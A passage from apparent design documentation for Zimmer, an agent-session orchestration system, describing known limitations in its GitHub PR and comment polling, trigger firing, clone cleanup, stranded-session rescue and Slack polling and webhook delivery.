([#1123](https://github.com/tadasant/zimmer/issues/1123)). Inheriting the ceiling is free, because
that evaluator reads the snapshot the pass already fetched; the two-minute cadence is not, because it
makes the whole pass due, and a pass spends a `gh pr view` per tracked PR and a `gh pr checks` per
open one — usually for one extra pass, at most about fifteen per suspicion. The cap is not a guarantee of delivery — the cases in
[A PR session waits for a merge message that three cases can prevent](#a-pr-session-waits-for-a-merge-message-that-three-cases-can-prevent)
are untouched by it. And the cap itself expires after `AWAITING_PR_OUTCOME_MAX_IDLE` (7 days) of no
user activity, because nothing removes an idle session from `Session.with_github_prs` and a deleted
or unreadable PR never resolves — so past a week the old 24-hour delay is back, deliberately, rather
than pinning a session at two polls an hour forever.

### One hung `gh` call now stalls PR status, CI, merge conflicts and comments together

PR status, comments and merge conflicts used to be three cron jobs, each a `total_limit: 1`
singleton. One of them wedging on a half-open connection to GitHub froze that one concern and left
the other two running. `Github::PrPollPass` fused them ([#711](https://github.com/tadasant/zimmer/issues/711)),
so they now run in series inside a single singleton and a wedge takes all three — including the
merged-PR message, which is the archive signal every PR-holding session in the fleet is waiting on.

Three things bound it rather than fix it. Every `gh` call goes through `GithubCli` under a
`BoundedSubprocess` deadline, so a hang is a failed call within 20–30 seconds rather than forever
(that is [#458](https://github.com/tadasant/zimmer/issues/458), already closed). The pass runs the
cheapest and most load-bearing evaluator first, so PR status is never queued behind a slow comment
fetch for the *same* session. And a tick that overruns is dropped rather than queued, which is the
behaviour each of the three jobs already had on its own.

What is genuinely worse than before: a slow session delays every session after it in the sweep for
all three concerns, not one; and `mergeable` now rides in the same `gh pr view` query as
`state,mergedAt`, so anything that makes that one field unserviceable takes PR status down with it
rather than only conflict detection. `mergeStateStatus` was left out of the query for exactly that
reason — GitHub serves it only to a viewer with push access and `gh` fails the whole query when one
requested field is refused. `body` and `labels` ride the same query for the goal check. Both are
readable by anyone who can read the PR, so neither can be the refused field. What they cost is size:
a long PR description now comes back on every poll of that PR.

Unlike `GithubTriggerPollerJob`, the pass has no heartbeat and no watchdog, so a freeze is still
detected by a human noticing that PRs stopped updating.

### The merge-conflict read no longer retries inside one tick

`GitHubMergeConflictPollerJob` used to ask GitHub for mergeability up to four times in a single
tick, sleeping 5 seconds between attempts, because GitHub answers "still computing" for a while
after a push. `Github::MergeConflictEvaluator` asks once per gated poll: an `UNKNOWN` reading is no
reading, both debounce markers are left alone, and the next gated poll two minutes later is the
retry.

That was deliberate — three blocking sleeps inside the fused singleton would delay PR status and
comment polling for every other session in the sweep, and the two-minute gate plus the
two-consecutive-readings debounce already provide the retry at a longer, safer interval. The cost is
latency in the window right after a push: where the old loop usually resolved `UNKNOWN` within one
tick, a conflict that first appears during that window is now suspected on the *next* gated poll and
confirmed on the one after, so first notification moves from about four minutes to about six.

The pathological case is a PR being force-pushed roughly as often as the gate fires: every gated
read can land in GitHub's recompute window, and two consecutive conflicting readings never
accumulate, so a real conflict on a PR under continuous rebasing may not be reported until the
pushing stops. The old retry loop narrowed that window without closing it either.

The same shape survives on an idle PR, narrowed rather than closed by
[#1123](https://github.com/tadasant/zimmer/issues/1123). A suspected conflict now gets its confirming
reading about two minutes after the first instead of up to a day later, but a stale `MERGEABLE` on
that confirming reading still clears the marker, and the session drops back to its 30-minute
ceiling until another conflicting reading starts a fresh suspicion. A genuinely conflicting PR that
GitHub keeps misreading as mergeable can still go un-reported for as long as it keeps doing so.

---

### The merged message reports what the merge fired, and it cannot tell a deploy from any other push job

For a PR whose merge triggers a deploy, merged is roughly the halfway point, so the merge
notification carries the workflow runs GitHub created on the merge commit and tells the session to
wait for them — see [What a merged PR tells the
session](/operate/background-jobs/#and-what-the-merge-fired). Three edges come with that.

**Every run on the merge commit counts, whatever it is.** The lookup asks "which runs exist because
this merge landed", which is the only question with an unambiguous answer; "which of these is the
deploy" would be a name-matching guess, and the deploy that motivated this
(`tadasant/tadasant-internal#1969`) was not called `deploy`. So a repository that runs anything on
pushes to its default branch keeps the merging session asleep for the few minutes it takes — and
that is not the exotic case: Zimmer's own repo has two such workflows (`CI` and `Release image`), so
most merges here take the wait rather than skipping it. Deliberate, on the view that a red `main` or
a failed release build is the merging session's business too. The wait is bounded (~20 minutes, then
the session archives naming the runs) and it is a sleep in `waiting` rather than a park in
`needs_input`, so it costs a little session time and never a slot in the action queue. Only a
repository with no default-branch push workflow at all gets the archive-immediately path on every
merge.

**A run created after the message is not in it.** A deploy chained off CI with `workflow_run` starts
only when CI finishes, which is minutes after the notification was written. The session watches the
runs it was told about; if all of those go green it archives, and a deploy that starts afterwards is
watched by nobody. The message's own `gh run list --commit <sha>` line partly covers this, since a
session that runs it later sees whatever exists by then, but nothing re-reads the list on the
session's behalf.

**"No runs" can mean "not yet".** The poller can catch a merge within a second or two of it
happening, before GitHub has created the runs it fired. That branch of the message hands the session
one `gh run list --commit <sha>` to settle it, and says explicitly that empty output — or a `gh` it
cannot run — means archive. A session whose `gh` is unauthenticated therefore takes the old
archive-immediately path, which is the deliberate fail-open: an unreadable lookup must not strand a
session that finished its work.

### An archived session's clone is held for as long as the `maintenance` lane is behind

`DeferredCloneCleanupJob` is the only reaper that may take an archived session's clone inside the
reversible window — `trash_after` is stamped before the job is enqueued, and both `StaleCloneCleanupJob`
and `EmptyTrashJob` are deliberately kept off a session that carries one
([background jobs](/operate/background-jobs/#an-interrupted-clone-cleanup-comes-back)). So the clone
is reclaimed at exactly the rate that lane drains, and nothing else is watching.

The lane has two threads, shared with the recurring sweeps, and the job's arrival rate is one row per
archive — bounded by nothing. Capping the scheduled sweeps at `SWEEP_BUDGET_SECONDS` and retrying interrupted
cleanups both raise the share of that lane the reaper gets, but neither makes it elastic — and `BundleInstallJob`
and `McpPackageReinstallJob` remain unbudgeted on the same two threads: while the
fleet archives faster than two threads can reclaim, the backlog and the bytes behind it grow
together. On 2026-09-05 that reached 124 ready rows, a head of line two hours old, and 276 clone
directories holding 43 GB.

The lever that would close the gap is `GOOD_JOB_MAINTENANCE_THREADS`, and it is not free: every
scheduler thread is a PostgreSQL connection the deployment promises, so raising it moves
`ConnectionBudget#required_backends` and the `app_required_backends` Terraform variable checked
against the managed cluster's plan ([the connection budget](/operate/deploying/#the-database-connection-budget)). Until then the
`starved_lane` page — `maintenance`, 100 ready, 60 minutes — is the signal that it has fallen behind,
and it is an accurate one.

---

## Triggers

### Workflow triggers exist, and nothing fires one

[Workflows](/sessions/workflows/) are Phase 0 of [#18](https://github.com/tadasant/zimmer/issues/18):
`WorkflowRunner`, `WorkflowRegistry`, the `workflow_runs` table and the `echo` reference workflow
are in the app and proven by tests, and have never run in production, because nothing calls them.
No firing site — the Slack, GitHub, schedule, `ao_event` and `system_event` pollers, the Invoke
button, `POST /api/v1/triggers/:id/invoke`, `action_trigger` — goes through `WorkflowRunner`, and no
surface can set `triggers.workflow_id`.

Two edges follow, and both fail loudly rather than quietly:

- **A workflow trigger that reached a template firing site would raise, not fire.** Those sites
  call `Trigger#interpolate_prompt` and `create_session!(prompt:)`, and both refuse a workflow
  trigger. A one-time schedule fire that raises parks the trigger `failed`; a recurring one
  advances its schedule and raises again at its next slot. Nothing can create such a row
  today; Phase 1's `Trigger#fire!` routes every site through `WorkflowRunner`.
- **If the `workflow_runs` insert fails, the session exists and is never enqueued.** The run is
  written when the session row commits and before its start job is enqueued (see
  `Trigger#create_new_session!`), so a failed write leaves a session that never starts rather than
  one that starts without its trusted identifiers.

### The spawn lock is a Postgres advisory lock, so two cases still slip past it

🟡 `skip_if_pending_session` runs its check and its spawn under a per-trigger Postgres **advisory**
lock (`Trigger.with_spawn_lock`), which is what stops two fires landing in the same instant from both
reading "nothing pending" and both spawning
([#606](https://github.com/tadasant/zimmer/issues/606)). Advisory rather than a row lock, because a
row lock would drag [burst control](/sessions/triggers/#burst-control)'s slot reservation into the
same transaction. Two narrow cases remain, and both are deliberate:

- **A fire that cannot take the lock within 15 seconds proceeds unserialized**, logging at `warn`.
  The protected section is one `SELECT` and one spawn, so a wait that long means the holder is wedged
  rather than busy — and dropping the fire instead would trade a rare duplicate session for a lost
  wake, which for the `quota_available` trigger strands every parked spot session until the next
  recovery. Under-spawning is the wrong direction to fail in here.
- **A caller that opened its own transaction gets no lock at all.** `SlackTriggerPollerJob` wraps
  `Trigger#create_session!` in a transaction so the session and the human-message record commit
  together. Taking the lock in there would serialize without protecting anything — a concurrent fire
  reads a snapshot that cannot contain the winner's uncommitted session, so it spawns regardless —
  and it would be actively unsafe, because a session-level advisory lock is not released by a
  rollback: a block that aborted that transaction would have its `UNLOCK` rejected along with the
  rest of it, stranding the lock on a pooled connection and disabling the guard for that trigger for
  good. So the lock is skipped and the fire says so at `info`. The exposure is narrow: the Slack and
  GitHub pollers are each capped at one running copy, so a duplicate needs a Slack fire concurrent
  with a *different* condition type on the same trigger, or with a hand-fired **Invoke**.

The dedup across fires — the thing the setting is mostly for — is unaffected by either.

### Agent-posted comments are only recognized when a known posting route posted them

`TranscriptHooks::GithubCommentAuthorshipHook` is what keeps Zimmer from routing its own agents'
GitHub comments back to agents, and it works by recognizing the *route* that posted the comment:
the commands `gh pr comment`, `gh issue comment`, `gh pr review` and `gh api` writes to a comments
endpoint, plus an MCP tool call whose name ends in one of `MCP_COMMENT_POST_TOOLS`. A comment posted
any other way — a Python script, a `curl`, an MCP server whose posting tool is named something not
on that list — leaves no `AgentPostedGithubComment` row, so it still looks exactly like a human
comment and can still wake a session. The `[CC Says]` marker remains a second line of defence for
those, with the weakness that put it here: an agent can forget it.

Deliberately narrow rather than scanning every tool result: an agent that merely *reads* a comment
gets that comment's own `html_url` back, and treating that as a post would silence a human. Covering
a new posting route means adding its pattern to `DIRECT_POST_PATTERNS`, its tool name to
`MCP_COMMENT_POST_TOOLS`, or teaching `gh_api_post?` the shape.

The MCP tier is narrower than the shell ones in what a result may vouch for: only the `html_url` of
the single JSON *object* the call answered with, never a free-text scan and never a JSON array,
which is the shape of a listing. So a server that answers in prose, or with a whole thread, records
nothing — a lost recording costs one comment its suppression, while a wrong one costs a human their
reply, permanently and fleet-wide.

Two things that tier does not reach. The pending-review tools on the list
(`add_comment_to_pending_review` and its longer spelling) are covered only as far as the server
answers with a permalink-bearing object; `github-mcp-server` acknowledges them in prose, and the
call that publishes the review (`submit_pending_pull_request_review`) answers with a
`#pullrequestreview-N` url, which is not a comment permalink and matches nothing — so that route
still records nothing today. And a **Pi** session cannot reach the tier at all: Pi calls every MCP
server through one proxy tool rather than by name, so there is no `mcp__<server>__<tool>` in its
transcript to key on (the same reason `GithubPrUrlHook`'s MCP create tier skips Pi).

The recognition reads what a command segment *runs*, not what it quotes
([#870](https://github.com/tadasant/zimmer/issues/870)), so `grep -rn "gh pr comment" docs/` over
this repo's own source is a read rather than a post — which matters because a wrong recording is
permanent and fleet-wide: `AgentPostedGithubComment` rows are global, so a human's comment id
recorded once is never delivered to any session again, and nothing logs it. The endpoint path of a
`gh api` write is the one part still read as written, since quoting it is ordinary and a quoted path
must not hide a real post. What stays unrecognized is the same short list `GithubPrUrlHook` has — an
**unquoted** mention (`echo gh pr comment`), a `\"`-escaped one, and a line of a heredoc body whose
terminator the splitter could not find — plus a post handed to a wrapper that is not a shell
(`ssh box "gh pr comment ..."`), which the splitter does not unwrap and which nothing in a session
does today. A *terminated* heredoc's body is out of the reading since
[#873](https://github.com/tadasant/zimmer/issues/873).

Classification is per command segment; the *output* is not split that way, because a tool result
arrives as one blob for the whole call. What a post's result vouches for is scoped instead
([#901](https://github.com/tadasant/zimmer/issues/901)). The whole blob counts only when the post was
the **whole command** and the only thing in it that reached GitHub; otherwise only the permalinks
printed alone on a line do — the shape `gh pr comment` prints, and one a JSON body never has. So the
post-then-confirm move (`gh pr comment 7 --body x && gh api repos/o/r/issues/7/comments`) records the
comment it posted and not the thread it then listed. A call that *names* a comments listing is capped
further, at one such line per posting segment, since `--jq '.[].html_url'` prints a whole thread in
exactly the shape a post prints.

Four edges are left, three of them lost recordings rather than wrong ones. A call that lists the
thread as bare URLs gives up its own post along with the thread, because nothing tells the lines
apart. A call that posts twice by *different* routes records only the one that printed a bare
permalink — a `gh api` reply's JSON in a shared result is indistinguishable from the JSON of a
comment merely read back, which is the thing that must not be recorded. A post whose URL its own
command wrapped in other text (`cd /repo && echo posted $(gh pr comment ...)`) is not recorded when
it shared the call, though it is when the post was the whole command. The one that goes the other
way: a command that prints a permalink alone on a line without naming a comments listing —
`cat thread-urls.txt` beside a post, or `gh api repos/o/r/issues/7/timeline --jq '.[].html_url'` —
is still read as the post's own output.

The #870 fix above — reading what a segment runs, not what it quotes — was forward-only, so the rows an earlier reading had already written were swept once, by the
`SweepMisrecordedAgentPostedGithubComments` post-deploy task
([#907](https://github.com/tadasant/zimmer/issues/907)). It re-derives each row from its recording
session's stored transcript and deletes the ones the fixed classifier would not have written — and
it is deliberately conservative about what it will not touch, because deleting a *correct* row
re-opens the self-reply loop while leaving a wrong one costs only what was already being paid. A row
whose recording session is gone, whose transcript was never stored or no longer parses, or whose
permalink no longer appears in the output of any command that names a posting invocation, is
**kept**. Those rows are counted on the
task's `stats` rather than passed over in silence, but they were not repaired, and nothing else will
repair them. The sweep also predates any fix for #901, so the rows that bug is still writing are
outside it by construction.

The same recognition gap sets the cost of the 60-second `ATTRIBUTION_GRACE_SECONDS` hold-down: every
human comment waits up to a minute longer (on top of the 30-second poll) before it wakes a session.

### A comment on a merged or closed PR no longer reaches the session

`Github::CommentEvaluator` drops a tracked PR the poll pass read as `merged` or `closed` before it
asks either comment endpoint, so a comment posted after the merge does not wake the session that
opened the PR — not a human's either. That is the deliberate half of the
[#214](https://github.com/tadasant/zimmer/issues/214) fix: a terminal PR's thread is where Zimmer's
own automation and an agent's own notes land, every session's `gh` authenticates as the human, and
the prompt the poller builds asks the agent to reply on GitHub — so a comment there is much more
likely to start a self-reply loop than to be a human waiting for an answer.

What a human loses is one route to a session, not the session: the web follow-up form, `POST
/api/v1/sessions/:id/enqueued_messages` and MCP `action_session` all reach a live session directly
and do not care whether a PR is open. Nothing announces the drop on GitHub, though — no 👀, no
reply — so a human commenting on a merged PR and expecting an agent gets silence. The skip is
logged at `info` naming the PR and the session.

`closed` is skipped on the same footing as `merged`, and the argument is weaker there: a PR closed
without merging can be reopened, and "reopen this and do X" is a comment a human plausibly leaves on
one. Two consequences follow. While the PR sits closed its comments are never fetched, so none of
them reaches the session; and if it is reopened, the next pass sees the whole backlog at once — all
of it after `github_pr_tracking_started_at`, which does not move — and enqueues a follow-up per
comment in one burst rather than one at a time. Both are the cost of the issue asking for
merged *and* closed; narrowing the skip to `merged` alone is the change to make if the closed case
turns out to matter more than the loop it prevents.

A PR the pass could not *read* is still polled: only a positive terminal reading stops it.

### A failed repo visibility lookup drops the comment

`Github::CommentEvaluator` only enqueues a follow-up when `GithubCommentPromptBuilder#actionable?`
says the agent is allowed to act on the repo publicly, and `actionable?` fails closed: if the
`gh api repos/OWNER/REPO` visibility call errors — rate limit, network blip, a repo that was
renamed — the repo is assumed public and the comment is skipped, with no prompt and no 👀. The
comment is still recorded in `custom_metadata`, so the poller's id-dedup means it is not
re-evaluated on the next tick: a real comment can be dropped permanently by one bad lookup.

Failing closed is the deliberate choice — acting publicly on a repo we couldn't check is worse
than missing a comment — and the blast radius is small, since `TRUSTED_OWNERS` short-circuits the
lookup entirely for `tadasant/*` (no API call, always actionable). The exposed case is a repo
owned by someone else that is actually private. The drop logs at `warn` naming the comment and
repo, which is the only signal you get.

### A failed one-time wake does not retry itself

A one-time wake whose fire raises is not destroyed: `ScheduleTriggerJob` (scheduled wakes) and
`AoEventTriggerJob` (session-scoped state-change wakes) park it in the `failed` status with the
error on the row, leave it in the list, and alert. What they do not do is try again. Parking is
what stops a persistent error (an unhealable agent root, a bad MCP reference) from re-firing
forever, and Zimmer has no way to tell that class of error apart from a blip worth one more
attempt — so it makes none and asks you.

The wake is late by however long it takes you to notice. Press **Re-arm** on the trigger (or call
`action_trigger` with `action=toggle`) and a scheduled wake fires within a minute. See
[Triggers](/sessions/triggers/#when-a-one-time-fire-fails).

A re-armed **state-change** wake is weaker than that, and the alert says so. It fires on its
watched session's transitions, so re-arming only delivers if that session transitions *again* —
and the common case for a failed wake is that the watched session was in the middle of its last
transition. Then no re-arm helps and the requester has to be resumed by hand. A broadcast
`ao_event` condition is never parked at all: it is recurring, so it alerts and keeps firing.

Two consequences worth knowing. A failure whose raise came *after* the schedule was consumed — the
session was created and only the cleanup behind it fell over — cannot be re-armed at all; the
trigger says so instead of offering a button that would do nothing, and you clear it by hand once
you have checked the session it spawned. And nothing ever reaps a failed trigger: it is deliberately
exempt from `CleanupStaleTriggersJob` and from sibling-wake cleanup, because deleting the record is
the bug. One systemic fault — a catalog rename that strands every trigger's agent root — therefore
parks every pending wake at once and leaves you a list to clear by hand.

### A dropped trigger work item is surfaced, not re-dispatched

A trigger fire is a one-shot event, and the session it creates is the only thing carrying it — the fire is spent the moment that session exists, deliberately, because the alternative is dispatching one event twice. So when that session reaches terminal `failed`, the work item is dropped and nothing will pick it up. Zimmer now says so: `OrphanedTriggerFire` writes an ERROR line on the session's timeline and raises an `#alerts` alert naming the trigger, the session and the GitHub subject ([#632](https://github.com/tadasant/zimmer/issues/632)). It does **not** re-dispatch. The population includes the merge gate — the one mechanism authorized to merge without human sign-off — and the only after-the-fact guard against redoing work already done reads a clone the reaper may already have removed. So the recovery is still a human's or an agent's deliberate re-dispatch; what changed is that it now happens in minutes instead of after eleven hours.

Three shapes of the same drop are not surfaced at all, each for a stated reason:

- A **one-time `schedule`** whose fire succeeded and whose session then died is a real orphan, but the population is keyed on `Session#genesis` so that the predicate costs no query inside the `fail` transition — and a one-time schedule is indistinguishable from a recurring one without loading the trigger's conditions. A recurring schedule is excluded on purpose: its next tick *is* the retry.
- A trigger's session that is **archived** rather than failed — force-archived by a human, or reaped — loses its work item identically and reports nothing. `archive` is a deliberate act far more often than `fail` is, so reporting on it would page for every tidy-up.
- A failure that happens while the **obs pipeline itself** is down leaves the ERROR record in the container log and nothing else. The stamp that marks a session as reported is written *after* the report rather than before, so the session stays eligible — but nothing re-runs the job, so in practice the only recovery is the session's timeline entry, which is written first.

### A stranded sleeper is rescued within ~20 minutes, not immediately

`waiting` is one word for two states: a session resting on a wake it will get, and a session resting
on a wake it will not. Zimmer can now tell them apart —
`SessionStateMachine.one_time_wake_pending?` asks whether a wake *can* fire rather than whether an
unfired row exists, and `StrandedSleepSweepJob` resumes the ones that cannot — but the telling apart
happens on a five-minute cron behind a fifteen-minute grace, not at the moment the wake is lost.

So a session whose wake set is destroyed without it being resumed still sits idle for up to about
twenty minutes. That is the deliberate trade: the grace is what stops the sweep from mistaking a fire
in flight on a congested `triggers` queue for a lost one, and an extra idle twenty minutes is much
cheaper than a spurious wake, which costs a whole agent turn and destroys whatever wake set the woken
turn had just armed.

The fireability test is narrow on purpose, and the narrowness has a cost of its own. Only a watched
session that is **archived or deleted** counts as unable to transition again. A watched session that
`failed` still counts as live — it can be restarted by hand, and it can still be archived, so a
`session_archived` watcher on it is real — which means a watcher whose watched session failed and
will in fact never be touched again keeps its requester asleep until the deadline backstop fires. If
there is no backstop, nothing wakes it, and the sweep will not either.

`wake_me_up_when_session_changes_state` and `wake_me_up_later` are documented as a pair for exactly
this reason. Two calls, not one.

### The stranded-sleep sweep has a hard visibility ceiling

`StrandedSleepRescue` answers its last two questions — can any of this session's wakes still fire, and is a recurring trigger driving it — in Ruby against the trigger rows, because neither is expressible as a `WHERE` clause. So the sweep cannot ask the database how many stranded sessions exist; it has to walk the candidate set and look.

It walks it in pages, oldest-first, and stops at `MAX_EXAMINED_PER_SWEEP` (1000) candidates. **Past that point it is blind by construction.** The paging is what makes the ceiling high rather than fifty — before it, a single `ORDER BY updated_at LIMIT 50` filled with legitimately sleeping sessions, which do not advance `updated_at` while they sleep and therefore sit at the head of that ordering for as long as they are asleep. A pass that hits the budget with candidates still behind it now says so at WARN, so the ceiling is observable rather than silent, but it is still a ceiling.

There is a second, tighter bound on the other side: `MAX_ACTIONS_PER_SWEEP` (5) rescues per pass, at a five-minute cadence, so the fleet-wide rate is 60 rescues an hour. Each one spends an agent turn, which is why it is deliberately smaller than `StalledStartSweepJob`'s ten. A mass-stranding event is drained over hours rather than in one pass.

Neither number is load-bearing against anything seen in production — the population this sweep exists for is a handful of sessions, not a thousand. They are written down because the failure they bound is the one the sweep was built to end, and a limit nobody has recorded is a limit nobody notices reaching.

### After three rescues Zimmer stops and leaves the session asleep

`StrandedSleepRescue` gives up on a session after `MAX_RESCUES` (3) — a session that has been resumed
three times and gone straight back to `waiting` with nothing armed each time is not a stall more
turns will fix. Giving up writes a `stranded_sleep_abandoned` marker, records the reason on the
session's own timeline, and alerts.

What it does **not** do is move the session anywhere a human will trip over it. There is no
`waiting → needs_input` transition in the state machine, and adding one for a branch that should
almost never run would be a change to the lifecycle made for an edge case. So the session stays in
`waiting`, off the homepage action queue, and the alert is the only thing that reaches a person. Any
ordinary resume or restart clears the marker and puts the session back under the sweep's care.

### While Slack is rate-limiting you, Slack triggers fire late

`SlackTriggerPollerJob` is a `total_limit: 1` singleton, so while it runs it *is* Slack polling for
the whole instance. It no longer waits a throttle out on that slot: `SlackService` absorbs only a
short blip in process (`MAX_RETRIES = 3`, backing off 1s, 2s, 4s), and hands anything longer back as
a `TransientError`. The job then reschedules itself — 30s, 60s, 120s, 240s, 480s, or Slack's own
`retry_after` if that is longer — and frees the worker thread meanwhile.

What that fixes is the dropped ticks: the run is no longer parked in a `sleep` rejecting every cron
tick that lands. What it does not fix is the delay. A `last_message_ts` cursor means nothing is
*lost* — the next successful poll still sees the messages — but a trigger can fire minutes after the
message that should have fired it. After five deferrals (about fifteen minutes) the job stops
deferring, alerts, and lets the ordinary once-a-minute cron take over.

Fixed in [#77](https://github.com/tadasant/zimmer/issues/77). The delay above is what that fix traded
the dropped ticks for.

"Nothing is lost" holds only because a cursor advances for work that actually completed, and one path
broke that: a throttled recent-history read degraded to an empty slice, which reads as "quiet
channel", and the sweep advanced its cursors past the messages that slice hid
([#522](https://github.com/tadasant/zimmer/issues/522)). That read raises instead, and every caller
makes it before anything fires — so **a channel whose recent history a poll cannot read is skipped
whole for that poll**, including top-level @mentions it had already fetched. Those fire on the
deferred poll. Later, rather than never.

### Coalescing groups a burst within one poll pass, so a burst can straddle a tick

Slack messages that land close together are folded into [one
session](/sessions/triggers/#coalescing-a-burst-of-slack-messages) rather than one each. The grouping
happens inside a single poll pass: `SlackTriggerPollerJob` ticks once a minute, and each pass groups
the messages *it* fetched. A burst whose messages fall either side of a tick boundary is two groups
and two sessions — not the seven the defect produced, but not one either.

Closing that would mean either holding a fire back until the channel has been quiet for the window
(which adds up to a poll cycle of latency to every alert, including the lone ones) or folding into a
session that already exists (which means queueing a message onto a session that may be about to
archive — the stranded-queued-message alert is exactly what the original burst was made of). Both
trade a worse failure for a smaller one, so the pass is the unit.

One smaller edge follows from the same choice: a group's prompt names the messages folded into it,
but nothing tells that session a sibling group was coalesced in the pass before it. The router prompt
already asks a session to check the channel for an investigation already under way, which is what
covers it.

### Passive listening decides restraint in the prompt, not in the poller

`passive_listen_thread` fires on every new reply in a thread Zimmer has spoken in, and
`passive_listen_channel` — while the channel is inside `CHANNEL_ENGAGEMENT_WINDOW` (6 hours) — on
every new top-level message from an allowed human. The poller cannot tell "any update on that PR?"
from "thanks, that worked": both continue a conversation Zimmer is in, so both spawn a session.
Whether the session then *says* anything is decided entirely by its prompt template, and a template
that isn't written for silence turns passive listening into a session per message.

Three bounds worth knowing:

- **Channel engagement is detected from what the poll already fetched** — Zimmer's own *top-level*
  posts among the last `RECENT_HISTORY_LIMIT` (50) messages, remembered per channel in
  `bot_activity_timestamps`. In a channel busy enough that Zimmer's last post falls outside that
  window before it is ever observed, `passive_listen_channel` simply doesn't engage. A reply it left
  inside a thread never counts, by design. `passive_listen_thread` is unaffected by all of this.
- **A thread seen for the first time is clamped to `THREAD_BACKFILL_HORIZON` (24 hours).** It has no
  cursor of its own, so it falls back to the channel's top-level cursor, which in a thread-heavy
  channel can be weeks old. The clamp caps the catch-up at a day — but that day still fires, so a
  passive condition meeting a busy old thread for the first time can spawn several sessions at once,
  bounded only by the trigger's `max_sessions_per_minute` burst cap (above which the rest are
  *dropped*).
- **A quiet tracked thread can wait several polls to be noticed.** A thread whose parent has scrolled
  out of the last 50 top-level messages costs a `conversations.replies` call to re-check, so the
  poller spends a fixed budget of `MAX_TRACKED_THREAD_RECHECKS` (20) of them per channel per poll:
  10 on the most-recently-active threads and 10 rotating through the rest. Everything inside
  `RECHECK_HORIZON` is visited — that is the fix for
  [#518](https://github.com/tadasant/zimmer/issues/518) — but the *first* reply in a thread that had
  gone quiet can sit for up to `ceil((n - 10) / 10)` polls before Zimmer sees it, which is about 17
  minutes on a channel tracking 172 threads. Once it is seen the thread joins the always-checked
  band, so the rest of the conversation answers at the ordinary one-minute cadence. With
  [Slack Events API delivery](/sessions/triggers/#slack-events-api-delivery) switched on, an
  @mention in such a thread fires as soon as Slack delivers it; passive listening still waits on the
  rotation, because the webhook does not serve it.
- **The budget bounds threads per poll, not Slack calls.** `SlackService.get_thread_replies`
  paginates at 100 until the thread is drained, so a thread carrying more than a page of unfetched
  replies costs more than one call. At the ordinary cadence a thread accrues far under a page between
  visits and the two numbers are the same, but a thread first re-checked across a long gap — a
  deploy, an outage — can cost several. That is the same rate-limit surface
  [#509](https://github.com/tadasant/zimmer/issues/509) and
  [#522](https://github.com/tadasant/zimmer/issues/522) are about, bounded only by how many threads
  are behind at once.
- **Catch-up on a thread met from a stale cursor is dropped, not deferred.** Passive listening clamps
  the oldest reply it will fire on to `THREAD_BACKFILL_HORIZON` (24 hours) — for a thread it has
  never seen *and* for one whose own cursor fell behind across a gap. Without that clamp the first
  re-check of a starved thread replays its whole backlog as a session apiece; with it, replies older
  than a day are passed over silently and the cursor advances past them anyway, so they are gone
  rather than queued. The trade is deliberate: a day-old Slack reply is one nobody is still waiting
  on an answer to, and a burst of sessions answering weeks-old messages is worse than silence.
- **`participating_threads` and `bot_activity_timestamps` grow monotonically** inside the
  condition's `configuration` JSONB, exactly like the `channel_timestamps` and `thread_timestamps`
  hashes they sit beside. Nothing prunes any of the four — and because all four live on the
  *condition*, replacing a condition rather than editing it in place starts from empty bookkeeping
  unless they are copied across by hand. That is not a clean slate: it both replays up to a day of
  thread replies and permanently loses threads whose parent has aged out of recent history. See
  [Triggers](/sessions/triggers/#passive-listening-passive_listen_thread-passive_listen_channel).

### An @mention can fall between `bot_mention` and passive listening

Passive listening refuses any message that mentions the bot, so that a mention inside a participated
thread stops matching two triggers and spawning two sessions on the same text (it did, on every
mention, until it was fixed). The refusal is unconditional: `passive_candidate?` cannot see whether a
`bot_mention` condition would actually catch the message, because the poller processes conditions
independently.

So the mention is dropped by *both* paths when the deployment has no `bot_mention` condition, when
that condition is disabled or scoped to one channel while the passive condition sweeps all of them,
or when the two carry different `allowed_user_ids` (that list is per-condition). The intended shape
is a `bot_mention` condition at least as wide as the passive ones; nothing enforces it. Each drop
logs one `info` line naming the message and the condition that declined it, which is the only signal
you get.

### GitHub is polled, and the Slack webhook has no public way in

GitHub PR status and comments are polled every 30 seconds per open PR. A 30-second latency floor and
a steady API burn. The `github_label` and `github_issue` trigger conditions are polled too, once a
minute, against GitHub's search API. There is no GitHub webhook ingress.

Slack has one. `POST /webhooks/slack` takes Slack Events API deliveries and fires Slack triggers from
them a second or two after the message is posted, instead of at the next poll — see
[Slack Events API delivery](/sessions/triggers/#slack-events-api-delivery). It is off by default, and
switching it on in production changes nothing on its own: Slack has to reach the endpoint from the
public internet, and Zimmer's tailnet posture offers no public ingress. Until something does — a scoped
public route, a tunnel, or a relay into the tailnet — the endpoint works only where the app is
publicly reachable, or locally with a signed request.

What the webhook does not cover yet:

- **The poller keeps running.** `webhook_with_poll_fallback` is the only webhook mode, so switching
  it on buys latency and a path that does not wait behind a stuck poll, and retires none of the
  Slack API calls the poller makes. The mode with no poller behind it arrives with the change that
  deletes `SlackTriggerPollerJob` and its watermarks, which is the decision recorded on
  [#141](https://github.com/tadasant/zimmer/issues/141).
- **Passive listening stays on the poller in every mode.** Whether a reply continues a conversation
  Zimmer is part of depends on `participating_threads` and `bot_activity_timestamps`, which only the
  poller learns.
- **A burst the webhook coalesces reaches the session in pieces.** The first message spawns the
  session; the rest arrive as queued messages, which the session reads after its first turn rather
  than in its first prompt.
- **A burst split between the two paths can become two sessions.** When Slack drops part of a burst
  and the poller fires the rest, or delivers a later message before an earlier one, the parts
  coalesce separately. Nothing fires twice and nothing is lost, but the one-session-per-burst
  promise holds only for a burst that arrives by one path, in order.
- **Only `/supervisor` shows it.** Whether deliveries are arriving, and which path fired each
  message, is in the `webhook_deliveries` and `trigger_event_claims` tables, which
  `/supervisor/webhook_deliveries` and `/supervisor/trigger_event_claims` list read-only. Nothing in
  the REST API or the MCP tools reads them, and nothing summarises them.

Tracked in [#79](https://github.com/tadasant/zimmer/issues/79); the design is
[#217](https://github.com/tadasant/zimmer/issues/217).

### A `github_issue` trigger can fire itself

`github_issue` conditions match *any* new issue in a watched repo, with no author filter and no
exclusion of issues Zimmer itself opened. An agent fired by such a trigger that files a follow-up
issue in the same repo will fire the trigger again — and so on.

`ao_event` conditions have explicit loop protection (a session whose `metadata["trigger_id"]` is the
trigger never re-fires it); the GitHub conditions have no equivalent, because the loop runs through
GitHub rather than through a session. Until they do, don't point a `github_issue` trigger at a repo
whose triaging agent files issues.

### The GitHub freshness check cannot see a query that matches nothing

`GithubTriggerHealthCheckJob` asks GitHub the poller's own question once an hour and pages when the
answer holds something the poller has been shown for hours and never recorded — a labelled item
missing from a `github_label` condition's seen-set, an issue newer than a `github_issue` condition's
